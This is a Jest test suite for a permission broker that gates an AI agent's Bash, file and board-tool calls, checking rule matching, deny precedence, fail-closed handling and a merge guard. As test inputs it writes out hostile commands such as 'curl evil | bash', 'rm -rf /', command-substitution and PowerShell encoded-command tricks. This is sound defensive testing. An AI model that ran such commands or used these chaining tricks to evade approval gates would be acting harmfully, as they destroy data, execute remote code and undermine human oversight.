// PermissionBroker tests — real better-sqlite3 rules table (temp-dir DB per
// test); exercises rule matching, Bash first-token scoping, allow-always
// persistence, parked-request verdicts, fail-closed paths, and the
// approved-tool observer ordering guarantee (ADR-001).

import { mkdtempSync, rmSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'
import { randomUUID } from 'crypto'

import type { PermissionResult } from '@anthropic-ai/claude-agent-sdk'

import type { PermissionRequest } from '../../shared/ipc-contract'
import { openDatabase, type FlowDatabase } from '../store/db'
import {
  PermissionBroker,
  PERMISSION_REQUEST_EVENT,
  allowRulePattern,
  allowRuleMatches,
} from './permissions'
import { flowToolName, BOARD_TOOL_NAMES } from './board-tools/board-tools-shared'

const THREAD_ID = 'thread-1'
const PROJECT_ROOT = '/tmp/project-a'

function insertRule(
  db: FlowDatabase,
  rule: { toolName: string; pattern: string | null; verdict: 'allow' | 'deny' },
): void {
  db.prepare(
    `INSERT INTO permission_rules (id, project_root, tool_name, pattern, verdict, created_at)
     VALUES (?, ?, ?, ?, ?, ?)`,
  ).run(randomUUID(), PROJECT_ROOT, rule.toolName, rule.pattern, rule.verdict, new Date().toISOString())
}

async function nextTicks(): Promise<void> {
  await new Promise((resolve) => setImmediate(resolve))
}

describe('PermissionBroker', () => {
  let tempDir: string
  let db: FlowDatabase
  let broker: PermissionBroker
  let requests: PermissionRequest[]

  async function callTool(
    toolName: string,
    input: Record<string, unknown>,
    signal: AbortSignal = new AbortController().signal,
  ): Promise<PermissionResult> {
    const canUseTool = broker.createCanUseTool(THREAD_ID, [PROJECT_ROOT])
    const result = await canUseTool(toolName, input, {
      signal,
      toolUseID: `tu-${randomUUID()}`,
      requestId: `req-${randomUUID()}`,
    })
    // The SDK type admits null, but the broker always resolves a verdict.
    if (result === null) throw new Error('canUseTool unexpectedly resolved null')
    return result
  }

  /** Call the tool and wait for the parked PermissionRequest to be emitted. */
  async function callAndPark(
    toolName: string,
    input: Record<string, unknown>,
  ): Promise<{ result: Promise<PermissionResult>; request: PermissionRequest }> {
    const before = requests.length
    const result = callTool(toolName, input)
    await nextTicks()
    expect(requests.length).toBe(before + 1)
    return { result, request: requests[requests.length - 1] }
  }

  beforeEach(() => {
    tempDir = mkdtempSync(join(tmpdir(), 'flow-permissions-'))
    db = openDatabase(join(tempDir, 'flow.sqlite'))
    broker = new PermissionBroker(db)
    requests = []
    broker.on(PERMISSION_REQUEST_EVENT, (request: PermissionRequest) => requests.push(request))
  })

  afterEach(() => {
    db.close()
    rmSync(tempDir, { recursive: true, force: true })
    jest.restoreAllMocks()
  })

  // ── AskUserQuestion auto-allow ───────────────────────────────────────

  describe('AskUserQuestion is auto-allowed (never a permission prompt)', () => {
    it('allows silently with no rule and no prompt', async () => {
      const result = await callTool('AskUserQuestion', {
        questions: [{ question: 'Which?', header: 'Pick', multiSelect: false, options: [] }],
      })
      expect(result.behavior).toBe('allow')
      expect(requests).toEqual([])
    })

    it('writes the picker answers onto updatedInput.answers', async () => {
      broker.setQuestionAsker(async () => ({ 'Which?': 'Option A' }))
      const input = {
        questions: [{ question: 'Which?', header: 'Pick', multiSelect: false, options: [] }],
      }
      const result = await callTool('AskUserQuestion', input)
      expect(result.behavior).toBe('allow')
      expect(result).toMatchObject({ updatedInput: { answers: { 'Which?': 'Option A' } } })
      expect(requests).toEqual([])
    })

    it('allows with the original input when the picker yields no answer', async () => {
      broker.setQuestionAsker(async () => null)
      const input = { questions: [{ question: 'Q', header: 'H', multiSelect: false, options: [] }] }
      const result = await callTool('AskUserQuestion', input)
      expect(result).toMatchObject({ behavior: 'allow', updatedInput: input })
    })
  })

  // ── flow/ artifacts auto-allow ───────────────────────────────────────

  describe('flow/ artifacts are auto-allowed', () => {
    it('an Edit under flow/ allows silently with no rule and no prompt', async () => {
      const result = await callTool('Edit', {
        file_path: '/tmp/project-a/flow/tasklist.md',
        old_string: 'a',
        new_string: 'b',
      })
      expect(result.behavior).toBe('allow')
      expect(requests).toEqual([])
    })

    it('a Write under flow/ allows silently', async () => {
      const result = await callTool('Write', {
        file_path: '/tmp/project-a/flow/brain/index.md',
        content: '# Brain',
      })
      expect(result.behavior).toBe('allow')
      expect(requests).toEqual([])
    })

    it('a real project file still parks for a user verdict', async () => {
      const { result, request } = await callAndPark('Write', {
        file_path: '/tmp/project-a/src/index.ts',
        content: 'x',
      })
      broker.respond(request.requestId, 'allow-once')
      expect((await result).behavior).toBe('allow')
    })
  })

  // ── Rule matching ────────────────────────────────────────────────────

  describe('rule matching', () => {
    it('a tool-wide allow rule short-circuits without asking the renderer', async () => {
      insertRule(db, { toolName: 'Read', pattern: null, verdict: 'allow' })

      const result = await callTool('Read', { file_path: '/tmp/project-a/x.ts' })
      expect(result.behavior).toBe('allow')
      expect(requests).toEqual([])
    })

    it('a prefix pattern matches against the primary input', async () => {
      insertRule(db, { toolName: 'Bash', pattern: 'npm', verdict: 'allow' })

      const allowed = await callTool('Bash', { command: 'npm run build' })
      expect(allowed.behavior).toBe('allow')

      // Non-matching prefix parks instead.
      const { result, request } = await callAndPark('Bash', { command: 'git push' })
      broker.respond(request.requestId, 'deny')
      expect((await result).behavior).toBe('deny')
    })

    it('deny dominates allow when both rules match', async () => {
      insertRule(db, { toolName: 'Bash', pattern: null, verdict: 'allow' })
      insertRule(db, { toolName: 'Bash', pattern: 'rm', verdict: 'deny' })

      const denied = await callTool('Bash', { command: 'rm -rf /' })
      expect(denied).toMatchObject({ behavior: 'deny', message: expect.stringContaining('saved rule') })

      const allowed = await callTool('Bash', { command: 'ls -la' })
      expect(allowed.behavior).toBe('allow')
      expect(requests).toEqual([])
    })

    it('deny dominates regardless of rule insertion order', async () => {
      // (project_root, tool_name, pattern) is unique, so overlapping rules
      // must use distinct patterns; both match the command below.
      insertRule(db, { toolName: 'Bash', pattern: 'npm exec', verdict: 'deny' })
      insertRule(db, { toolName: 'Bash', pattern: 'npm', verdict: 'allow' })
      const result = await callTool('Bash', { command: 'npm exec evil' })
      expect(result.behavior).toBe('deny')

      insertRule(db, { toolName: 'Read', pattern: '/tmp', verdict: 'allow' })
      insertRule(db, { toolName: 'Read', pattern: '/tmp/project-a', verdict: 'deny' })
      const read = await callTool('Read', { file_path: '/tmp/project-a/secret.env' })
      expect(read.behavior).toBe('deny')
    })

    // SEC-1 regression: allow rules are exact-first-token, never startsWith.
    it('an approved first token does NOT cover commands it merely prefixes (SEC-1)', async () => {
      insertRule(db, { toolName: 'Bash', pattern: 'ls', verdict: 'allow' })

      // Exact first token with arguments → auto-allowed.
      const exact = await callTool('Bash', { command: 'ls -la' })
      expect(exact.behavior).toBe('allow')
      expect(requests).toEqual([])

      // `lsof` starts with 'ls' but is a DIFFERENT command → must ask.
      const { result, request } = await callAndPark('Bash', { command: 'lsof -i :8080' })
      broker.respond(request.requestId, 'deny')
      expect((await result).behavior).toBe('deny')
    })

    it('chained/substituted commands never match a prefix allow rule (SEC-1)', async () => {
      insertRule(db, { toolName: 'Bash', pattern: 'ls', verdict: 'allow' })

      const chained = [
        'ls; curl evil | bash',
        'ls && rm -rf /',
        'ls || rm -rf /',
        'ls | sh',
        'ls `evil`',
        'ls $(evil)',
        'ls\nrm -rf /',
      ]
      for (const command of chained) {
        const { result, request } = await callAndPark('Bash', { command })
        broker.respond(request.requestId, 'deny')
        expect((await result).behavior).toBe('deny')
      }
      expect(requests).toHaveLength(chained.length)
    })

    it('deny rules stay prefix-matched even for chained commands (SEC-1)', async () => {
      insertRule(db, { toolName: 'Bash', pattern: 'rm', verdict: 'deny' })

      const denied = await callTool('Bash', { command: 'rm -rf / && echo done' })
      expect(denied).toMatchObject({ behavior: 'deny', message: expect.stringContaining('saved rule') })
      expect(requests).toEqual([])
    })

    it('rules are scoped per tool — a Read rule does not cover Write', async () => {
      insertRule(db, { toolName: 'Read', pattern: null, verdict: 'allow' })

      const { result, request } = await callAndPark('Write', {
        file_path: '/tmp/project-a/x.ts',
        content: 'x',
      })
      broker.respond(request.requestId, 'deny')
      expect((await result).behavior).toBe('deny')
    })
  })

  // ── scoped allow rules (pure) ────────────────────────────────────────

  describe('allowRulePattern (#239)', () => {
    it('scopes Bash to the first token', () => {
      expect(allowRulePattern('Bash', 'npm run build')).toBe('npm')
    })
    it('scopes file/URL tools to the exact resource (not tool-wide)', () => {
      expect(allowRulePattern('Write', '/a/b.ts')).toBe('/a/b.ts')
      expect(allowRulePattern('Edit', '/a/spaced path.ts')).toBe('/a/spaced path.ts')
      expect(allowRulePattern('WebFetch', 'https://x.dev')).toBe('https://x.dev')
    })
    it('records tool-wide (null) only when there is no resource to scope to', () => {
      expect(allowRulePattern('SomeTool', null)).toBeNull()
    })
  })

  describe('allowRuleMatches (#239)', () => {
    it('matches a file rule ONLY on the exact same path', () => {
      expect(allowRuleMatches('Write', '/a/b.ts', '/a/b.ts')).toBe(true)
      expect(allowRuleMatches('Write', '/a/b.ts', '/a/c.ts')).toBe(false)
    })
    it('matches a spaced path exactly (no first-token truncation)', () => {
      expect(allowRuleMatches('Edit', '/a/my file.ts', '/a/my file.ts')).toBe(true)
      expect(allowRuleMatches('Edit', '/a/my file.ts', '/a/my other.ts')).toBe(false)
    })
    it('keeps Bash first-token semantics', () => {
      expect(allowRuleMatches('Bash', 'npm', 'npm run build')).toBe(true)
      expect(allowRuleMatches('Bash', 'ls', 'lsof')).toBe(false)
    })
    it('a null (tool-wide) pattern still matches anything', () => {
      expect(allowRuleMatches('Read', null, '/anything')).toBe(true)
    })
  })

  // ── PowerShell chaining (Phase 4) ─────────────────────────────────────
  // On win32 the string in a Bash call is a PowerShell command. SEC-1's POSIX
  // metacharacter set misses several ways PowerShell can put a second action
  // behind a first token that matches an allow rule. The platform is pinned
  // explicitly so the branch runs from a POSIX test host (NFR3), and the same
  // inputs are asserted against 'darwin' to show the POSIX branch is unchanged.
  describe('allowPatternMatches on win32 (Phase 4)', () => {
    const matchesOn = (platform: string, command: string): boolean =>
      allowRuleMatches('Bash', 'npm', command, platform)

    it('still matches a plain approved command', () => {
      expect(matchesOn('win32', 'npm run build')).toBe(true)
      expect(matchesOn('win32', 'npm test -- --no-coverage')).toBe(true)
    })

    it('refuses a redirect — an approved `npm` must not cover a write out of the project', () => {
      expect(matchesOn('win32', String.raw`npm test > ..\plan-flow-work\x`)).toBe(false)
      expect(matchesOn('win32', String.raw`npm test >> C:\other\x`)).toBe(false)
      // POSIX keeps today's behavior exactly: redirection is not chaining there.
      expect(matchesOn('darwin', 'npm test > ../other/x')).toBe(true)
    })

    it('refuses PowerShell’s other subexpression forms', () => {
      expect(matchesOn('win32', 'npm @(evil)')).toBe(false)
      expect(matchesOn('win32', 'npm ${evil}')).toBe(false)
      // Only `$(` was in the POSIX set, so darwin allows these unchanged.
      expect(matchesOn('darwin', 'npm @(evil)')).toBe(true)
    })

    it('refuses variable expansions spliced into the command', () => {
      expect(matchesOn('win32', 'npm run $env:TASK')).toBe(false)
      expect(matchesOn('win32', 'npm run %TASK%')).toBe(false)
    })

    it('refuses a CR-only second line, which the POSIX \\n set misses', () => {
      expect(matchesOn('win32', 'npm test\rRemove-Item x')).toBe(false)
    })

    it('refuses an encoded command or an evaluated string behind an approved token', () => {
      expect(matchesOn('win32', 'npm -EncodedCommand cmVtb3ZlLWl0ZW0geA==')).toBe(false)
      expect(matchesOn('win32', 'npm -enc cmVtb3ZlLWl0ZW0geA==')).toBe(false)
      expect(matchesOn('win32', 'npm iex evil')).toBe(false)
      expect(matchesOn('win32', 'npm Start-Process evil')).toBe(false)
      expect(matchesOn('win32', 'npm New-PSDrive X FileSystem C:\\')).toBe(false)
    })

    it('keeps every POSIX chaining rule in force on win32 too', () => {
      for (const command of [
        'npm; Remove-Item x',
        'npm && Remove-Item x',
        'npm || Remove-Item x',
        'npm | Out-File x',
        'npm `evil`',
        'npm $(evil)',
        'npm\nRemove-Item x',
      ]) {
        expect(matchesOn('win32', command)).toBe(false)
      }
    })

    it('leaves non-Bash tools platform-independent (exact resource match)', () => {
      expect(allowRuleMatches('Write', 'C:\\p\\x.ts', 'C:\\p\\x.ts', 'win32')).toBe(true)
      expect(allowRuleMatches('Write', 'C:\\p\\x.ts', 'C:\\p\\y.ts', 'win32')).toBe(false)
    })

    it('defaults to the host platform when no platform is passed', () => {
      expect(allowRuleMatches('Bash', 'npm', 'npm run build')).toBe(true)
    })
  })

  // ── allow-always persistence & Bash first-token scoping ──────────────

  describe('allow-always persistence', () => {
    it('Bash allow-always persists a rule scoped to the command first token', async () => {
      const { result, request } = await callAndPark('Bash', { command: 'npm  test --silent' })
      broker.respond(request.requestId, 'allow-always')
      expect((await result).behavior).toBe('allow')

      const rules = broker.listRules(PROJECT_ROOT)
      expect(rules).toHaveLength(1)
      expect(rules[0]).toMatchObject({ toolName: 'Bash', pattern: 'npm', verdict: 'allow' })

      // Same first token → auto-allowed; different command → asks again.
      const sameTool = await callTool('Bash', { command: 'npm run build' })
      expect(sameTool.behavior).toBe('allow')
      expect(requests).toHaveLength(1)

      const { request: gitRequest } = await callAndPark('Bash', { command: 'git status' })
      expect(gitRequest.toolName).toBe('Bash')
    })

    it('non-Bash allow-always scopes the rule to the EXACT file, not tool-wide (#239)', async () => {
      const { result, request } = await callAndPark('Read', { file_path: '/tmp/project-a/a.ts' })
      broker.respond(request.requestId, 'allow-always')
      await result

      const rules = broker.listRules(PROJECT_ROOT)
      expect(rules).toHaveLength(1)
      // Scoped to the path — NOT a tool-wide (null) rule.
      expect(rules[0]).toMatchObject({
        toolName: 'Read',
        pattern: '/tmp/project-a/a.ts',
        verdict: 'allow',
      })

      // The SAME file auto-allows with no new prompt…
      const same = await callTool('Read', { file_path: '/tmp/project-a/a.ts' })
      expect(same.behavior).toBe('allow')
      expect(requests).toHaveLength(1)

      // …but a DIFFERENT file still parks — the grant is not blanket.
      const { request: otherReq } = await callAndPark('Read', { file_path: '/tmp/project-a/other.ts' })
      expect(otherReq.toolName).toBe('Read')
      expect(requests).toHaveLength(2)
    })

    it('Write allow-always on one file does NOT auto-approve edits to other files (#239)', async () => {
      // The exact reported scenario: approving one Write must not silently grant
      // a project-wide write primitive.
      const { result, request } = await callAndPark('Write', {
        file_path: '/tmp/project-a/src/a.ts',
        content: 'x',
      })
      broker.respond(request.requestId, 'allow-always')
      expect((await result).behavior).toBe('allow')

      // A Write to a DIFFERENT file must still park for approval.
      const { request: bReq } = await callAndPark('Write', {
        file_path: '/tmp/project-a/package.json',
        content: 'y',
      })
      expect(bReq.toolName).toBe('Write')
      expect(requests).toHaveLength(2)
    })

    it('allow-once does NOT persist a rule — the same call asks again', async () => {
      const first = await callAndPark('Bash', { command: 'npm test' })
      broker.respond(first.request.requestId, 'allow-once')
      expect((await first.result).behavior).toBe('allow')
      expect(broker.listRules(PROJECT_ROOT)).toEqual([])

      const second = await callAndPark('Bash', { command: 'npm test' })
      broker.respond(second.request.requestId, 'deny')
      expect((await second.result).behavior).toBe('deny')
      expect(requests).toHaveLength(2)
    })

    it('duplicate allow-always verdicts do not violate the unique rule index', async () => {
      const first = await callAndPark('Bash', { command: 'npm test' })
      const second = await callAndPark('Bash', { command: 'npm run lint' })
      broker.respond(first.request.requestId, 'allow-always')
      broker.respond(second.request.requestId, 'allow-always')
      await Promise.all([first.result, second.result])

      expect(broker.listRules(PROJECT_ROOT)).toHaveLength(1)
    })
  })

  // ── Pending-request verdict resolution ───────────────────────────────

  describe('pending requests', () => {
    it('allow verdicts echo the ORIGINAL input as updatedInput', async () => {
      const input = { command: 'npm test', description: 'run tests' }
      const { result, request } = await callAndPark('Bash', input)
      broker.respond(request.requestId, 'allow-once')

      expect(await result).toMatchObject({ behavior: 'allow', updatedInput: input })
    })

    it('deny verdicts resolve with a deny result', async () => {
      const { result, request } = await callAndPark('Bash', { command: 'npm test' })
      broker.respond(request.requestId, 'deny')

      expect(await result).toEqual({ behavior: 'deny', message: 'Denied by user' })
    })

    it('listPending reflects parked requests and empties after respond', async () => {
      const { result, request } = await callAndPark('Bash', { command: 'npm test' })
      expect(broker.listPending().map((r) => r.requestId)).toEqual([request.requestId])

      broker.respond(request.requestId, 'deny')
      await result
      expect(broker.listPending()).toEqual([])
    })

    it('sanitizes secret-looking input keys in the renderer preview', async () => {
      const { result, request } = await callAndPark('WebFetch', {
        url: 'https://example.com',
        apiKey: 'sk-very-secret',
      })
      expect(request.inputPreview).toContain('[redacted]')
      expect(request.inputPreview).not.toContain('sk-very-secret')
      expect(request.inputPreview).toContain('https://example.com')

      broker.respond(request.requestId, 'deny')
      await result
    })
  })

  // ── Fail-closed ──────────────────────────────────────────────────────

  describe('fail-closed', () => {
    it('responding to an unknown or already-settled request is a no-op, not a throw (#96)', async () => {
      // A verdict on a disposed/unknown id must not throw (that wedged the
      // still-visible card in a retry-error dead-end); the first settle wins.
      expect(() => broker.respond('never-existed', 'allow-once')).not.toThrow()

      const { result, request } = await callAndPark('Bash', { command: 'npm test' })
      broker.respond(request.requestId, 'deny')
      expect((await result).behavior).toBe('deny')
      // A second, late verdict is ignored — it does not flip the settled deny.
      expect(() => broker.respond(request.requestId, 'allow-once')).not.toThrow()
    })

    it('an aborted request resolves to deny', async () => {
      const controller = new AbortController()
      const result = callTool('Bash', { command: 'npm test' }, controller.signal)
      await nextTicks()

      controller.abort()
      expect(await result).toEqual({
        behavior: 'deny',
        message: 'Interrupted before approval',
      })
      expect(broker.listPending()).toEqual([])
    })

    // LOG-7 regression: an already-aborted signal never fires 'abort' again,
    // so parking on it would hang the tool call forever.
    it('a pre-aborted signal resolves to deny immediately without parking (LOG-7)', async () => {
      const controller = new AbortController()
      controller.abort()

      const result = await callTool('Bash', { command: 'npm test' }, controller.signal)
      expect(result).toEqual({
        behavior: 'deny',
        message: 'Interrupted before approval',
      })
      expect(requests).toEqual([])
      expect(broker.listPending()).toEqual([])
    })

    it('disposeThread denies every request still parked for that thread', async () => {
      const { result } = await callAndPark('Bash', { command: 'npm test' })

      broker.disposeThread(THREAD_ID)
      expect(await result).toEqual({
        behavior: 'deny',
        message: 'Session ended before approval',
      })
      expect(broker.listPending()).toEqual([])
    })
  })

  // ── Approved-tool observer (ADR-001 ordering) ────────────────────────

  describe('approved-tool observer', () => {
    it('is awaited BEFORE a user-approved allow releases the tool call', async () => {
      const order: string[] = []
      broker.setApprovedToolObserver(async (call) => {
        await new Promise((resolve) => setTimeout(resolve, 20))
        order.push(`observer:${call.toolName}`)
      })

      const { result, request } = await callAndPark('Write', {
        file_path: '/tmp/project-a/new.ts',
        content: 'x',
      })
      broker.respond(request.requestId, 'allow-once')
      await result
      order.push('released')

      expect(order).toEqual(['observer:Write', 'released'])
    })

    it('is awaited BEFORE a rule-based allow returns', async () => {
      insertRule(db, { toolName: 'Edit', pattern: null, verdict: 'allow' })
      const order: string[] = []
      broker.setApprovedToolObserver(async () => {
        await new Promise((resolve) => setTimeout(resolve, 20))
        order.push('observer')
      })

      await callTool('Edit', { file_path: '/tmp/project-a/x.ts', old_string: 'a', new_string: 'b' })
      order.push('released')
      expect(order).toEqual(['observer', 'released'])
    })

    it('is NOT invoked for denied tool calls', async () => {
      insertRule(db, { toolName: 'Bash', pattern: null, verdict: 'deny' })
      const observer = jest.fn()
      broker.setApprovedToolObserver(observer)

      await callTool('Bash', { command: 'rm -rf /' })
      expect(observer).not.toHaveBeenCalled()
    })

    it('observer failures are logged but never block the allow', async () => {
      const errorSpy = jest.spyOn(console, 'error').mockImplementation(() => undefined)
      broker.setApprovedToolObserver(() => {
        throw new Error('observer exploded')
      })

      const { result, request } = await callAndPark('Bash', { command: 'npm test' })
      broker.respond(request.requestId, 'allow-once')

      expect((await result).behavior).toBe('allow')
      expect(errorSpy).toHaveBeenCalled()
    })

    it('receives the thread, root, tool, and full input of the approved call', async () => {
      const observer = jest.fn()
      broker.setApprovedToolObserver(observer)
      const input = { file_path: '/tmp/project-a/x.ts', content: 'hello' }

      const { result, request } = await callAndPark('Write', input)
      broker.respond(request.requestId, 'allow-once')
      await result

      expect(observer).toHaveBeenCalledWith({
        threadId: THREAD_ID,
        projectRoot: PROJECT_ROOT,
        toolName: 'Write',
        input,
      })
    })
  })

  // ── merge guard (#1135) ──────────────────────────────────────────────

  describe('merge guard: a standing allow rule never finishes a merge', () => {
    beforeEach(() => {
      // The exact shape that let the agent "add, stage and commit" on its own.
      insertRule(db, { toolName: 'Bash', pattern: 'git', verdict: 'allow' })
    })

    it('asks anyway when the root is mid-merge, despite the allow rule', async () => {
      broker.setMergeStateProbe(async () => true)
      const { result, request } = await callAndPark('Bash', { command: 'git commit -m "resolve"' })

      expect(request.summary).toMatch(/your call/i)
      broker.respond(request.requestId, 'deny')
      await expect(result).resolves.toMatchObject({ behavior: 'deny' })
    })

    it('honors the allow rule for the same command with no merge in progress', async () => {
      broker.setMergeStateProbe(async () => false)
      const result = await callTool('Bash', { command: 'git commit -m "ordinary work"' })

      expect(result.behavior).toBe('allow')
      expect(requests).toEqual([])
    })

    it('leaves non-decision git commands auto-allowed mid-merge', async () => {
      broker.setMergeStateProbe(async () => true)
      const result = await callTool('Bash', { command: 'git status' })

      expect(result.behavior).toBe('allow')
      expect(requests).toEqual([])
    })

    it('asks when the probe throws — an unverifiable repo never auto-commits', async () => {
      jest.spyOn(console, 'error').mockImplementation(() => {})
      broker.setMergeStateProbe(async () => {
        throw new Error('not a repo')
      })
      const { result, request } = await callAndPark('Bash', { command: 'git commit -m x' })

      broker.respond(request.requestId, 'deny')
      await expect(result).resolves.toMatchObject({ behavior: 'deny' })
    })

    it('is inert when no probe is wired', async () => {
      const result = await callTool('Bash', { command: 'git commit -m x' })
      expect(result.behavior).toBe('allow')
      expect(requests).toEqual([])
    })
  })

  // Board writes always ask, ahead of the saved-rule check — the same placement
  // the merge guard uses. State the positive (the gate fires) before the absence
  // (reads are not caught) — allowed-pattern #28.
  describe('board writes always ask (agent-board-tools)', () => {
    const START_LOOP = flowToolName(BOARD_TOOL_NAMES.startLoop)
    const CREATE = flowToolName(BOARD_TOOL_NAMES.createTask)
    const LIST = flowToolName(BOARD_TOOL_NAMES.listTasks)

    it('a board write parks even when a saved allow rule exists for it', async () => {
      insertRule(db, { toolName: START_LOOP, pattern: null, verdict: 'allow' })
      const { result, request } = await callAndPark(START_LOOP, {})
      // The card shows the consequence, not the machine tool name.
      expect(request.summary).toBe('The agent wants to start the board loop')
      broker.respond(request.requestId, 'deny')
      await expect(result).resolves.toMatchObject({ behavior: 'deny' })
    })

    it('a board READ is not caught by the gate — a saved allow rule lets it through', async () => {
      insertRule(db, { toolName: LIST, pattern: null, verdict: 'allow' })
      const result = await callTool(LIST, {})
      expect(result.behavior).toBe('allow')
      expect(requests).toEqual([])
    })

    it('an allow-always on a board write persists no rule (the gate would ignore it)', async () => {
      const { result, request } = await callAndPark(CREATE, { title: 'x' })
      broker.respond(request.requestId, 'allow-always')
      await expect(result).resolves.toMatchObject({ behavior: 'allow' })
      expect(broker.listRules(PROJECT_ROOT)).toEqual([])
    })
  })
})
